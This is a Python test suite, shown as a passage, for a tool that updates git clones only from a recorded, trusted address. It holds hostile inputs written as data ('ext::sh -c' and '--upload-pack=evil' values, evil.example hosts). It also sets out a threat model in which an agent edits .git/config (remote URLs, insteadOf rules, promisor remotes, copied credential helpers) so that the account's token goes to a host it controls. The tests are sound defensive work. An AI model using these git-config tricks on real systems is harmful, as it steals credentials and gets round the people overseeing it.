                self.assertIn("SDLCA_REFRESH_TIMEOUT", handle.read(), name)



class AddressTests(RefreshCase):
    """The update trusts only the git address that sdlca-worlds recorded for the world, outside the clone. Without one nothing is trusted."""

    def counting_git(self):
        """The environment for a git that notes every call it is given. Returns it and the file the notes go to."""
        calls = os.path.join(self.tmp.name, "git-calls")
        body = 'echo called >> "$GIT_CALLS"\nexec "$REAL_GIT" "$@"\n'
        return {"PATH": self.path_with(self.fake_git(body)), "GIT_CALLS": calls}, calls

    def test_a_world_with_no_recorded_address_is_unverified_and_no_git_runs(self):
        self.push_from_other("greeting.txt", "two\n")
        env, calls = self.counting_git()
        before = self.raw_snapshot()
        for given in (None, "-", ""):  # no second argument, the handler's dash, and an empty one
            with self.subTest(address=given):
                answer = self.refresh(env=env, address=given)
                self.assertAnswer(answer, "skipped", "unverified")
                self.assertEqual(answer.text, "no git address is recorded for this world, so git was not run (sdlca-worlds --apply records it)")
                self.assertFalse(os.path.exists(calls), "git was run")
                self.assertEqual(self.raw_snapshot(), before)
        # the control: the same clone, given its address, is updated, and the same recorder sees git run
        self.assertAnswer(self.refresh(env=env), "updated", "ok")
        self.assertTrue(os.path.exists(calls), "control: the recorder saw no git call, so the checks above prove nothing")

    def test_an_address_the_update_cannot_work_with_is_unverified_and_is_never_echoed(self):
        secret_path = "secret-path-segment"
        for bad in ("https://" + "bob:hunter2" + "@git.spawn.co/@alice/game-1.git",  # check-secrets:allow (a made-up password, to prove it is refused and not echoed)
                    "https://git.spawn.co@evil.example/%s.git" % secret_path, "ssh://git@git.spawn.co/%s.git" % secret_path, "git://git.spawn.co/%s.git" % secret_path,
                    "ftp://git.spawn.co/%s.git" % secret_path, "/tmp/%s.git" % secret_path, "git@git.spawn.co:%s.git" % secret_path,
                    "ext::sh -c touch% " + self.marker, "https://git.spawn.co/%s x.git" % secret_path, "https://git.spawn.co/%s.git?token=abc" % secret_path,
                    "https://git.spawn.co/%s/../b.git" % secret_path, "https://git.spawn.co:99999/%s.git" % secret_path, "--upload-pack=evil", "https:///%s.git" % secret_path,
                    "https://git.spawn.co/%s.git\n" % secret_path, "x" * 5000):
            with self.subTest(address=bad[:60]):
                env, calls = self.counting_git()
                answer = self.refresh(env=env, address=bad)
                self.assertAnswer(answer, "skipped", "unverified")
                self.assertEqual(answer.text, "the git address recorded for this world is not one this update accepts, so git was not run "
                                              "(sdlca-worlds --apply records the one Spawn gives)")
                for part in ("hunter2", secret_path, "evil.example"):
                    self.assertNotIn(part, answer.line)  # a recorded value is not echoed: it could hold anything
                self.assertFalse(os.path.exists(calls), "git was run")
        self.assertFalse(os.path.exists(self.marker))

    def test_unverified_is_decided_before_the_clone_is_looked_at_and_after_the_off_switch(self):
        missing = os.path.join(self.tmp.name, "nothing-here")
        self.assertAnswer(self.refresh(clone=missing, address=None), "skipped", "unverified")
        self.assertAnswer(self.refresh(clone=missing, address="-", env={"SDLCA_REFRESH_TIMEOUT": "0"}), "skipped", "off")
        self.assertAnswer(self.refresh(clone=missing, env={"SDLCA_REFRESH_TIMEOUT": "0"}), "skipped", "off")
        self.assertAnswer(self.refresh(clone=missing), "skipped", "not-git")  # with an address the old answers are the same as before

    def test_the_address_is_an_argument_and_the_clones_own_settings_never_supply_one(self):
        """The clone says where the world is, in its remote. Without the recorded address that must not be used."""
        self.push_from_other("greeting.txt", "two\n")
        before = self.raw_snapshot()
        self.assertAnswer(self.refresh(address=None), "skipped", "unverified")
        self.assertEqual(self.raw_snapshot(), before)
        self.assertEqual(self.git("rev-parse", "origin/main").stdout.strip(), self.head())  # nothing was fetched into the tracking branch either


class BindingTests(RefreshCase):
    """The clone's remote must be the recorded address. The comparison is by scheme, host, port and path, and it is deliberately plain."""

    def behind_by_one(self):
        return self.push_from_other("greeting.txt", "two\n")

    SAME = (
        "https://git.spawn.co/@alice/game-1.git", "HTTPS://GIT.SPAWN.CO/@alice/game-1.git", "https://Git.Spawn.Co/@alice/game-1.git",
        "https://git.spawn.co/@alice/game-1", "https://git.spawn.co/@alice/game-1.git/", "https://git.spawn.co/@alice/game-1/", "https://git.spawn.co/@alice/game-1.git//",
    )
    DIFFERENT = (
        ("a host that merely starts with the right name", "https://git.spawn.co.evil.example/@alice/game-1.git"),
        ("a host that merely ends with it", "https://evil-git.spawn.co/@alice/game-1.git"),
        ("another port", "https://git.spawn.co:8443/@alice/game-1.git"),
        ("the default port written out", "https://git.spawn.co:443/@alice/game-1.git"),
        ("another scheme", "http://git.spawn.co/@alice/game-1.git"),
        ("another world on the same host", "https://git.spawn.co/@alice/game-2.git"),
        ("a path in another case", "https://git.spawn.co/@Alice/game-1.git"),
        ("a host with a dot at its end", "https://git.spawn.co./@alice/game-1.git"),
        ("user information", "https://bob@git.spawn.co/@alice/game-1.git"),
        ("the right host as the user information of another", "https://git.spawn.co@evil.example/@alice/game-1.git"),
        ("a numeric host", "https://127.0.0.1/@alice/game-1.git"),
        ("an IPv6 host", "https://[::1]/@alice/game-1.git"),
        ("a dot segment", "https://git.spawn.co/@alice/../@mallory/game-1.git"),
        ("a query", "https://git.spawn.co/@alice/game-1.git?x=1"),
        ("ssh", "ssh://git@git.spawn.co/@alice/game-1.git"),
        ("an address in the style of scp", "git@git.spawn.co:@alice/game-1.git"),
        ("a local path", "/tmp/elsewhere.git"),
        ("a file address", "file:///tmp/elsewhere.git"),
    )

    def test_the_recorded_address_in_another_spelling_is_still_the_recorded_address(self):
        self.use_https_address()
        for spelling in self.SAME:
            with self.subTest(remote=spelling):
                self.git("remote", "set-url", "origin", spelling)
                self.assertAnswer(self.refresh(), "current", "ok")  # it got as far as the fetch, which is from the recorded address in any case

    def test_a_remote_that_is_not_the_recorded_address_is_not_trusted_and_nothing_changes(self):
        self.use_https_address()
        self.behind_by_one()
        for what, remote in self.DIFFERENT:
            with self.subTest(what=what):
                self.git("remote", "set-url", "origin", remote)
                before = self.raw_snapshot()
                answer = self.refresh()
                self.assertAnswer(answer, "skipped", "untrusted")
                self.assertIn("the clone's remote origin", answer.text)
                self.assertNotIn("://", answer.text)  # hosts only: never a whole address
                self.assertNotIn("alice", answer.text)
                self.assertEqual(self.raw_snapshot(), before)  # not even FETCH_HEAD, and the branch did not move
        self.git("remote", "set-url", "origin", SPAWN_ADDRESS)
        self.assertAnswer(self.refresh(), "updated", "ok")  # put right, the same clone is updated

    def test_the_text_names_hosts_and_never_a_whole_address(self):
        self.use_https_address()
        secret = "secret-path-segment"
        self.git("remote", "set-url", "origin", "https://evil.example:8443/%s/x.git" % secret)
        answer = self.refresh()
        self.assertEqual(answer.text, "the clone's remote origin points to host evil.example:8443, not to host git.spawn.co, "
                                      "where the address recorded for this world is; nothing was fetched or changed")
        for odd in ("https://" + "bob:hunter2" + "@evil.example/%s/x.git" % secret,  # check-secrets:allow
                    "https://evil.example/%s/x.git?token=abc" % secret, "git@evil.example:%s/x.git" % secret, "/tmp/%s.git" % secret):
            self.git("remote", "set-url", "origin", odd)
            answer = self.refresh()
            self.assertAnswer(answer, "skipped", "untrusted")
            self.assertEqual(answer.text, "the clone's remote origin points to an address that is not a plain URL, not to host git.spawn.co, "
                                          "where the address recorded for this world is; nothing was fetched or changed")
            for part in ("hunter2", secret, "evil.example"):
                self.assertNotIn(part, answer.line)
        self.git("remote", "set-url", "origin", "https://git.spawn.co/%s/x.git" % secret)  # the same host and port: it says that, and still not the path
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertEqual(answer.text, "the clone's remote origin is not the address recorded for this world, although both point to host git.spawn.co "
                                      "(the scheme, port or path differs); nothing was fetched or changed")
        self.assertNotIn(secret, answer.line)

    def test_a_host_that_is_too_long_to_show_is_cut_and_a_hostile_one_cannot_break_the_line(self):
        self.use_https_address()
        self.git("remote", "set-url", "origin", "https://" + "a" * 300 + ".example/x.git")
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn("host " + "a" * 47 + "...", answer.text)
        self.assertNotIn("a" * 60, answer.text)

    def test_a_remote_with_no_address_or_with_two_is_not_one_the_update_follows(self):
        self.git("config", "--unset-all", "remote.origin.url")
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "no-upstream")
        self.assertEqual(answer.text, "the remote origin that the branch follows has no address in the clone's settings")
        self.git("config", "--add", "remote.origin.url", self.address)
        self.git("config", "--add", "remote.origin.url", "file:///tmp/a-second-address.git")
        before = self.raw_snapshot()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertEqual(answer.text, "the remote origin has 2 addresses in the clone's settings, not one; nothing was fetched or changed")
        self.assertEqual(self.raw_snapshot(), before)
        self.git("config", "--unset-all", "remote.origin.url")
        self.git("config", "--add", "remote.origin.url", self.address)
        self.git("config", "branch.main.remote", ".")  # a branch that follows another branch of this very repository follows no world
        self.assertAnswer(self.refresh(), "skipped", "no-upstream")

    def test_a_remote_whose_name_is_an_address_is_never_shown(self):
        """git accepts an address as branch.<name>.remote. It has no settings of its own in the clone, so the branch follows no remote the
        update knows, and the log must not repeat what the clone calls it."""
        secret = "secret-path-segment"
        for name in ("https://evil.example/%s.git" % secret, "git@evil.example:%s.git" % secret, "a" * 80):
            with self.subTest(name=name[:30]):
                self.git("config", "branch.main.remote", name)
                answer = self.refresh()
                self.assertAnswer(answer, "skipped", "no-upstream")
                self.assertEqual(answer.text, "the remote (a name that is not plain) that the branch follows has no address in the clone's settings")
        self.git("config", "branch.main.remote", "origin")
        self.assertAnswer(self.refresh(), "current", "ok")

    def test_the_fetch_names_the_recorded_address_and_not_the_remote(self):
        self.use_https_address()
        spelled = "HTTPS://GIT.SPAWN.CO/@alice/game-1"
        self.git("remote", "set-url", "origin", spelled)  # the same address, spelled another way
        new = self.behind_by_one()
        answer, calls, _ = self.recorded_run()
        self.assertAnswer(answer, "updated", "ok")
        self.assertEqual(self.head(), new)
        fetch = next(call for call in calls if "fetch" in call)
        after_dashes = fetch[fetch.index("--") + 1:]
        self.assertEqual(after_dashes[0], SPAWN_ADDRESS)  # the address as it was recorded, spelling and all
        self.assertNotIn("origin", fetch[fetch.index("fetch"):])
        for call in calls:
            self.assertNotIn(spelled, call)  # the clone's own spelling is never handed to git

    def test_a_fetch_from_an_address_does_not_apply_the_settings_of_a_remote_and_one_through_its_name_does(self):
        """The premise of fetching from the address: what the clone's settings say about a remote (a program to run, a proxy, another
        address) does not reach a fetch that names the address. A control shows that the same setting does reach a fetch through the name."""
        program = self.program()
        self.git("config", "--local", "remote.origin.uploadpack", program)
        self.git("fetch", "-q", "--", "origin", "+refs/heads/main:refs/sdlca/probe", check=False)  # the program is no upload-pack: this fetch fails, and that is fine
        self.assertTrue(os.path.exists(self.marker), "control: git did not run the remote's program, so this test proves nothing")
        os.unlink(self.marker)
        self.git("fetch", "-q", "--", self.address, "+refs/heads/main:refs/sdlca/probe")
        self.assertFalse(os.path.exists(self.marker), "a fetch that names the address ran the remote's program")

    def test_what_still_reaches_a_fetch_from_an_address_stays_on_the_list(self):
        """url.<base>.insteadOf rewrites an address that is named on the command line, so it stays refused, and with it the other settings
        that can send a request somewhere else."""
        other = os.path.join(self.tmp.name, "other-world.git")
        self.git("clone", "-q", "--bare", self.world, other, cwd=self.tmp.name)
        self.write(self.other, "evil.txt", "from the other world\n")
        self.git("add", ".", cwd=self.other)
        self.git("commit", "-q", "-m", "evil", cwd=self.other)
        self.git("push", "-q", other, "main", cwd=self.other)  # the other world is ahead of the real one
        rule = "url.%s.insteadOf" % ("file://" + other)
        self.git("config", "--local", rule, self.address)
        self.git("fetch", "-q", "--", self.address, "+refs/heads/main:refs/sdlca/probe")  # control: plain git, given the recorded address, fetches from the other world
        self.assertEqual(self.git("rev-parse", "refs/sdlca/probe").stdout.strip(), self.head(other))
        self.assertNotEqual(self.head(other), self.git("rev-parse", "origin/main").stdout.strip())
        self.git("update-ref", "-d", "refs/sdlca/probe")
        before = self.raw_snapshot()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn("url.", answer.text)
        self.assertEqual(self.raw_snapshot(), before)  # nothing was fetched from the other world, or from the real one


class AttackTests(RefreshCase):
    """The attack that the recorded address closes. An agent that can edit .git/config points a clone at a host it controls, and copies the
    kit's own credential helper line under that host's scope, so that the update would fetch from there and hand it the account's token.
    The host here is a server on this machine that records every request. Each test shows that it sees none, and a control shows that
    it WOULD have seen the request, with the token, without the recorded address."""

    ENV = {"GIT_ALLOW_PROTOCOL": "http:file"}  # http is allowed, as it would be if the account's environment said so: the update must refuse for another reason
    TOKEN_HEADER = "Basic " + base64.b64encode(b"alice_helper:secret-test-password").decode()

    def rewrite_to(self, made, scope, with_helper=True):
        """What the agent does to the clone: another remote, and a copy of the kit's helper scoped to it, that is sent without being asked."""
        self.git("config", "--local", "remote.origin.url", scope + "/evil.git", cwd=made)
        if with_helper:
            self.git("config", "--local", "credential.%s.helper" % scope, gitcred.helper_command("alice_helper", self.token_file), cwd=made)
            self.git("config", "--local", "http.%s.proactiveAuth" % scope, "basic", cwd=made)

    def old_fetch(self, clone):
        """The fetch that the first version of the update ran after its checks: through the remote's name, with the same safety settings."""
        settings = []
        for setting in refresh.GIT_SETTINGS:
            settings += ["-c", setting]
        return self.git(*settings, "fetch", "--no-tags", "--no-recurse-submodules", "--no-write-fetch-head", "--quiet", "--", "origin",
                        "+refs/heads/main:refs/sdlca/refresh-tip", cwd=clone, check=False, extra_env=self.ENV)

    def tokens_seen(self, server):
        return [seen[2] for seen in server.seen if seen[2]]

    def test_a_clone_rewritten_to_point_at_another_host_sends_nothing_there(self):
        made = self.kit_made_clone()
        self.push_from_other("greeting.txt", "two\n")  # the world has moved, so the update has real work to do
        with RecordingProxy() as attacker:
            scope = "http://127.0.0.1:%d" % attacker.port
            self.rewrite_to(made, scope)
            before = self.raw_snapshot(made)
            answer = self.refresh(clone=made, address=SPAWN_ADDRESS, env=self.ENV)
            self.assertEqual(attacker.seen, [], "a request reached the host that the clone was rewritten to point at: " + answer.line)
            self.assertAnswer(answer, "skipped", "untrusted")
            self.assertEqual(self.raw_snapshot(made), before)
            # The controls. First: what the agent wrote is in the kit's own form, and the first version's rule for the scope of a helper accepted
            # it, so that version went on to fetch (the new check is the only thing that refuses it).
            value = self.git("config", "--local", "credential.%s.helper" % scope, cwd=made).stdout.strip()
            self.assertTrue(refresh.helper_is_the_kits(value, self.env), "the copy of the kit's helper is not in the kit's own form, so the attack is not the real one")
            self.assertTrue(OLD_HELPER_SCOPE.fullmatch(scope), "the first version's rule would have refused this scope, so the control proves nothing")
            # Second: the fetch that the first version ran, and plain git, both connect to the host and hand the token over.
            self.old_fetch(made)
            reached = len(attacker.seen)
            self.assertGreaterEqual(reached, 1, "control: the fetch of the first version did not reach the host")
            self.assertEqual(set(self.tokens_seen(attacker)), {self.TOKEN_HEADER}, "control: the token was not sent there, so the test proves nothing")
            self.git("fetch", "-q", "origin", "main", cwd=made, check=False, extra_env=self.ENV)
            self.assertGreater(len(attacker.seen), reached, "control: plain git did not connect to the host")
            self.assertEqual(set(self.tokens_seen(attacker)), {self.TOKEN_HEADER})

    def test_a_rewritten_remote_without_a_helper_is_refused_and_says_where_it_points(self):
        made = self.kit_made_clone()
        with RecordingProxy() as attacker:
            scope = "http://127.0.0.1:%d" % attacker.port
            self.rewrite_to(made, scope, with_helper=False)
            answer = self.refresh(clone=made, address=SPAWN_ADDRESS, env=self.ENV)
            self.assertEqual(attacker.seen, [], "a request reached the host that the clone was rewritten to point at: " + answer.line)
            self.assertAnswer(answer, "skipped", "untrusted")
            self.assertEqual(answer.text, "the clone's remote origin points to host 127.0.0.1:%d, not to host git.spawn.co, where the address recorded "
                                          "for this world is; nothing was fetched or changed" % attacker.port)
            self.git("fetch", "-q", "origin", "main", cwd=made, check=False, extra_env=self.ENV)
            self.assertTrue(attacker.seen, "control: plain git did not connect to the host, so the test proves nothing")

    def test_a_branch_switched_to_another_remote_is_refused_too(self):
        made = self.kit_made_clone()
        with RecordingProxy() as attacker:
            scope = "http://127.0.0.1:%d" % attacker.port
            self.git("remote", "add", "evil", scope + "/evil.git", cwd=made)
            self.git("config", "--local", "credential.%s.helper" % scope, gitcred.helper_command("alice_helper", self.token_file), cwd=made)
            self.git("config", "--local", "http.%s.proactiveAuth" % scope, "basic", cwd=made)
            self.git("config", "--local", "branch.main.remote", "evil", cwd=made)
            answer = self.refresh(clone=made, address=SPAWN_ADDRESS, env=self.ENV)
            self.assertEqual(attacker.seen, [], "a request reached the host that the branch was switched to: " + answer.line)
            self.assertAnswer(answer, "skipped", "untrusted")
            self.git("fetch", "-q", "evil", "main", cwd=made, check=False, extra_env=self.ENV)
            self.assertEqual(set(self.tokens_seen(attacker)), {self.TOKEN_HEADER}, "control: plain git did not hand the token over, so the test proves nothing")

    def test_url_rewriting_in_the_clone_cannot_redirect_the_fetch_from_the_recorded_address(self):
        made = self.kit_made_clone()
        self.git("config", "--file", self.global_config, "--unset-all", "url.%s.insteadOf" % ("file://" + self.world))  # so that the clone's own rule is the one that applies
        with RecordingProxy() as attacker:
            scope = "http://127.0.0.1:%d" % attacker.port
            self.git("config", "--local", "url.%s/evil.git.insteadOf" % scope, SPAWN_ADDRESS, cwd=made)
            answer = self.refresh(clone=made, address=SPAWN_ADDRESS, env=self.ENV)
            self.assertEqual(attacker.seen, [], "the fetch from the recorded address was redirected: " + answer.line)
            self.assertAnswer(answer, "skipped", "untrusted")
            self.assertIn("url.", answer.text)
            # control: a fetch that names the address, as the update does, is sent to the host by plain git, which is why this key stays on the list
            self.git("fetch", "-q", "--", SPAWN_ADDRESS, "+refs/heads/main:refs/sdlca/probe", cwd=made, check=False, extra_env=self.ENV)
            self.assertTrue(attacker.seen, "control: plain git did not follow the rewrite, so the test proves nothing")

    def test_a_helper_scoped_to_another_origin_is_refused_even_when_the_remote_is_right(self):
        made = self.kit_made_clone()
        kits = gitcred.helper_command("alice_helper", self.token_file)
        with RecordingProxy() as other:
            scope = "http://127.0.0.1:%d" % other.port
            for key, value in (("credential.%s.helper" % scope, kits), ("credential.%s.helper" % scope, ""),  # even an empty one: it is for another origin
                               ("credential.https://evil.example.helper", kits), ("credential.https://git.spawn.co:8443.helper", kits),
                               ("credential.http://git.spawn.co.helper", kits), ("credential.https://*.spawn.co.helper", kits),
                               ("credential.https://git.spawn.co/@alice.helper", kits)):
                with self.subTest(key=key, value=value[:12]):
                    self.git("config", "--local", "--add", key, value, cwd=made)
                    before = self.raw_snapshot(made)
                    answer = self.refresh(clone=made, address=SPAWN_ADDRESS, env=self.ENV)
                    self.assertAnswer(answer, "skipped", "untrusted")
                    self.assertIn("credential.", answer.text)
                    self.assertEqual(self.raw_snapshot(made), before)
                    self.git("config", "--local", "--unset-all", key, cwd=made)
            self.assertEqual(other.seen, [])
            self.assertAnswer(self.refresh(clone=made, address=SPAWN_ADDRESS, env=self.ENV), "current", "ok")  # and with all of them removed the clone is trusted again
            # control: asked about that origin, git would hand the token over, so refusing the helper is not a formality
            self.git("config", "--local", "credential.%s.helper" % scope, kits, cwd=made)
            filled = subprocess.run([REAL_GIT, "credential", "fill"], input="protocol=http\nhost=127.0.0.1:%d\n\n" % other.port, cwd=made, capture_output=True,
                                    text=True, timeout=WATCHDOG, env=dict(self.env, PATH=os.environ["PATH"]))
            self.assertIn("password=secret-test-password", filled.stdout, "control: git did not offer the token to that origin")

    def test_the_record_is_what_is_trusted_a_clone_that_agrees_with_it_may_use_the_helper_scoped_to_it(self):
        """If the record names a host, a clone that agrees with it is updated from that host and may use the helper scoped to it. That is why the
        record must be kept where the agent cannot edit it (docs/security-model.md)."""
        with AuthenticatedGitServer(self.tmp.name) as server:
            scope = "http://127.0.0.1:%d" % server.port
            address = scope + "/world.git"
            self.git("remote", "set-url", "origin", address)
            self.git("config", "--local", "credential.helper", "")
            self.git("config", "--local", "credential.%s.helper" % scope, gitcred.helper_command("alice_helper", self.token_file))
            self.git("config", "--local", "http.%s.proactiveAuth" % scope, "basic")
            new = self.push_from_other("greeting.txt", "two\n")
            self.git("update-server-info", cwd=self.world)
            self.assertAnswer(self.refresh(env={"GIT_ALLOW_PROTOCOL": "http"}, address=address), "updated", "ok")
            self.assertEqual(self.head(), new)
            self.assertIn(self.TOKEN_HEADER, server.seen)
            # a second helper, for the same machine and another port, is for another origin
            self.git("config", "--local", "credential.http://127.0.0.1:1.helper", gitcred.helper_command("alice_helper", self.token_file))
            self.assertAnswer(self.refresh(env={"GIT_ALLOW_PROTOCOL": "http"}, address=address), "skipped", "untrusted")


class LazyFetchTests(RefreshCase):
    """Reading an object that is missing can make git fetch it, by itself, from a promisor remote that the clone's settings name. The update
    reads objects (HEAD's commit is the first), so its check of the settings must come before that, or a request goes to a host the agent
    chose, and carries the token if a copy of the kit's own helper is scoped to that host. The host here is a server on this machine."""

    ENV = {"GIT_ALLOW_PROTOCOL": "http:file"}
    TOKEN_HEADER = AttackTests.TOKEN_HEADER

    def promisor_clone(self, attacker, with_helper=True):
        """A clone as sdlca-worlds makes it, rewritten the way an agent would: the attacker is a promisor remote (three lines of .git/config)."""
        made = self.kit_made_clone()
        scope = "http://127.0.0.1:%d" % attacker.port
        self.git("config", "--local", "extensions.partialclone", "evil", cwd=made)
        self.git("config", "--local", "remote.evil.url", scope + "/evil.git", cwd=made)
        self.git("config", "--local", "remote.evil.promisor", "true", cwd=made)
        if with_helper:
            self.git("config", "--local", "credential.%s.helper" % scope, gitcred.helper_command("alice_helper", self.token_file), cwd=made)
            self.git("config", "--local", "http.%s.proactiveAuth" % scope, "basic", cwd=made)
        # What makes git read an object that is not there, with no file deleted: the branch names a commit that the clone does not have.
        with open(os.path.join(made, ".git", "refs", "heads", "main"), "w") as handle:
            handle.write("1" * 40 + "\n")
        return made

    def read_head_commit(self, made, extra_env=None):
        """What the update's first object read is: plain git."""
        return self.git("rev-parse", "--verify", "-q", "HEAD^{commit}", cwd=made, check=False, extra_env=dict(self.ENV, **(extra_env or {})))

    def tokens_seen(self, server):
        return [seen[2] for seen in server.seen if seen[2]]

    def test_a_promisor_remote_is_not_asked_for_a_missing_commit_and_gets_no_token(self):
        with RecordingProxy() as attacker:
            made = self.promisor_clone(attacker)
            before = self.raw_snapshot(made)
            answer = self.refresh(clone=made, address=SPAWN_ADDRESS, env=self.ENV)
            self.assertEqual(attacker.seen, [], "a request reached the promisor remote: " + answer.line)
            self.assertAnswer(answer, "skipped", "untrusted")
            self.assertIn("extensions.partialclone", answer.text)
            self.assertEqual(self.raw_snapshot(made), before)
            # control: plain git, reading that same commit, asks the promisor remote for it, and hands over the token
            self.read_head_commit(made)
            self.assertTrue(attacker.seen, "control: plain git did not ask the promisor remote, so this test proves nothing")
            self.assertEqual(set(self.tokens_seen(attacker)), {self.TOKEN_HEADER}, "control: the token was not sent there, so this test proves nothing")

    def test_a_promisor_remote_with_no_helper_is_not_contacted_either(self):
        with RecordingProxy() as attacker:
            made = self.promisor_clone(attacker, with_helper=False)
            answer = self.refresh(clone=made, address=SPAWN_ADDRESS, env=self.ENV)
            self.assertEqual(attacker.seen, [], "a request reached the promisor remote: " + answer.line)
            self.assertAnswer(answer, "skipped", "untrusted")
            self.read_head_commit(made)
            self.assertTrue(attacker.seen, "control: plain git did not ask the promisor remote, so this test proves nothing")

    def test_each_of_the_keys_alone_is_enough(self):
        for keys in ((("extensions.partialclone", "evil"),), (("remote.evil.promisor", "true"),), (("remote.evil.partialclonefilter", "blob:none"),),
                     (("promisor.acceptfromserver", "all"),)):
            with self.subTest(keys=keys):
                for key, value in keys:
                    self.git("config", "--local", key, value)
                answer = self.refresh()
                self.assertAnswer(answer, "skipped", "untrusted")
                self.assertIn(keys[0][0], answer.text)
                for key, _ in keys:
                    self.git("config", "--local", "--unset-all", key)
        self.assertAnswer(self.refresh(), "current", "ok")

    def test_the_settings_are_checked_before_the_first_call_that_reads_an_object(self):
        self.git("config", "--local", "remote.evil.promisor", "true")
        answer, calls, _ = self.recorded_run()
        self.assertAnswer(answer, "skipped", "untrusted")
        verbs = [next(a for a in call if a in ("--version", "rev-parse", "symbolic-ref", "config", "for-each-ref", "fetch", "rev-list", "merge")) for call in calls]
        self.assertEqual(verbs[0], "--version")
        self.assertEqual(set(verbs), {"--version", "rev-parse", "config"})  # the clone's settings and the top of the work tree, and nothing that reads an object
        self.assertFalse([call for call in calls if "--verify" in call], calls)
        # so the settings decide even for a clone that would have been skipped for another reason before
        self.git("checkout", "-q", "--detach")
        self.assertAnswer(self.refresh(), "skipped", "untrusted")  # not "detached"
        self.git("checkout", "-q", "main")
        self.git("config", "--local", "--unset", "branch.main.remote")
        self.assertAnswer(self.refresh(), "skipped", "untrusted")  # not "no-upstream"

    def test_the_environment_alone_turns_the_fetching_on_demand_off(self):
        """The second layer. If a git call that reads an object did run in such a clone, git would still not fetch the object."""
        version = re.search(r"(\d+)\.(\d+)", self.git("--version").stdout)
        if (int(version.group(1)), int(version.group(2))) < (2, 44):
            self.skipTest("GIT_NO_LAZY_FETCH needs git 2.44 or newer")
        with RecordingProxy() as attacker:
            made = self.promisor_clone(attacker, with_helper=False)
            environ = dict(self.env, PATH=os.environ["PATH"], **self.ENV)
            env = refresh.git_environment(environ, made)
            self.assertEqual(env.get("GIT_NO_LAZY_FETCH"), "1")
            refresh.Git(REAL_GIT, made, env, 30).run("rev-parse", "--verify", "-q", "HEAD^{commit}")
            self.assertEqual(attacker.seen, [])
            del env["GIT_NO_LAZY_FETCH"]  # control: without the variable the same call asks the promisor remote
            refresh.Git(REAL_GIT, made, env, 30).run("rev-parse", "--verify", "-q", "HEAD^{commit}")
            self.assertTrue(attacker.seen, "control: git did not ask the promisor remote, so this test proves nothing")


class RemoteNameTests(RefreshCase):
    """git reads the word that `git fetch -- <address>` is given as the NAME of a remote first. A remote section called like the recorded address,
    with a url of its own, would be used for that fetch: the update names the address and not a remote, but this one is still reached."""

    def other_world_ahead(self):
        """A second repository: the world's history and one more commit, as a server that an agent chose would offer."""
        other = os.path.join(self.tmp.name, "other-world.git")
        self.git("clone", "-q", "--bare", self.world, other, cwd=self.tmp.name)
        self.write(self.other, "from-the-attacker.txt", "evil\n")
        self.git("add", ".", cwd=self.other)
        self.git("commit", "-q", "-m", "evil", cwd=self.other)
        self.git("push", "-q", other, "main", cwd=self.other)
        return other

    def test_a_remote_called_like_the_recorded_address_is_not_followed(self):
        other = self.other_world_ahead()
        self.git("config", "--local", "remote.%s.url" % self.address, "file://" + other)
        # control: given the recorded address, plain git takes the commits of the other repository, because of the remote that is called that
        self.git("fetch", "-q", "--", self.address, "+refs/heads/main:refs/sdlca/probe")
        self.assertEqual(self.git("rev-parse", "refs/sdlca/probe").stdout.strip(), self.head(other))
        self.assertNotEqual(self.head(other), self.git("rev-parse", "origin/main").stdout.strip())
        self.git("update-ref", "-d", "refs/sdlca/probe")
        before = self.raw_snapshot()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn("remote.(a name that is not plain).url", answer.text)
        self.assertNotIn(self.world, answer.line)  # the name is an address: it is never shown
        self.assertNotIn("://", answer.text)
        self.assertEqual(self.raw_snapshot(), before)
        self.assertFalse(os.path.exists(os.path.join(self.clone, "from-the-attacker.txt")))
        self.git("config", "--local", "--unset-all", "remote.%s.url" % self.address)
        self.assertAnswer(self.refresh(), "current", "ok")  # and with the remote gone the clone is trusted again

    def test_a_remote_called_like_the_recorded_address_sends_no_request_anywhere(self):
        made = self.kit_made_clone()
        self.push_from_other("greeting.txt", "two\n")  # the world has moved, so the update has real work to do
        with RecordingProxy() as attacker:
            scope = "http://127.0.0.1:%d" % attacker.port
            self.git("config", "--local", "remote.%s.url" % SPAWN_ADDRESS, scope + "/evil.git", cwd=made)
            answer = self.refresh(clone=made, address=SPAWN_ADDRESS, env=AttackTests.ENV)
            self.assertEqual(attacker.seen, [], "a request reached the host that the remote called like the address names: " + answer.line)
            self.assertAnswer(answer, "skipped", "untrusted")
            self.git("fetch", "-q", "--", SPAWN_ADDRESS, "+refs/heads/main:refs/sdlca/probe", cwd=made, check=False, extra_env=AttackTests.ENV)
            self.assertTrue(attacker.seen, "control: plain git did not connect to the host, so this test proves nothing")

    def test_which_remote_names_are_plain(self):
        env = {}
        for name in ("origin", "upstream", "my.remote", "fork-1", "a_b", "2nd", "v1.2.3"):
            with self.subTest(plain=name):
                for variable in ("url", "pushurl", "fetch"):
                    self.assertFalse(refresh.risky_setting("remote.%s.%s" % (name, variable), "x", env), name)
                self.assertEqual(refresh.shown_key("remote.%s.url" % name), "remote.%s.url" % name)
        for name in ("https://git.spawn.co/@alice/game-1.git", "file:///tmp/world.git", "git@git.spawn.co:alice/game-1.git", "a/b", "a@b", "x:y", ".hidden/x",
                     "has space", "ünï"):
            with self.subTest(address=name):
                self.assertTrue(refresh.risky_setting("remote.%s.url" % name, "x", env), name)
                self.assertTrue(refresh.risky_setting("remote.%s.fetch" % name, "x", env), name)
                self.assertEqual(refresh.shown_key("remote.%s.url" % name), "remote.(a name that is not plain).url")
        for key in ("remote.pushdefault", "remote.pushDefault", "branch.main.remote", "remotes.x"):  # not a section of a remote
            self.assertFalse(refresh.risky_setting(key, "x", env), key)
            self.assertEqual(refresh.shown_key(key), key)

    def test_a_second_remote_with_a_plain_name_is_fine(self):
        """The rule is about names that are addresses. A person's own clone may have another remote, and that alone does not stop the update."""
        self.git("remote", "add", "upstream", "file:///somewhere/else.git")
        self.git("config", "--local", "remote.upstream.fetch", "+refs/heads/*:refs/remotes/upstream/*")
        self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(), "updated", "ok")


class TrackingTests(RefreshCase):
    """The fetch writes the tracking branch itself, because a fetch from an address does not, and the clone's reflog of that branch is what the
    fork-point logic reads."""

    def behind_by_one(self):
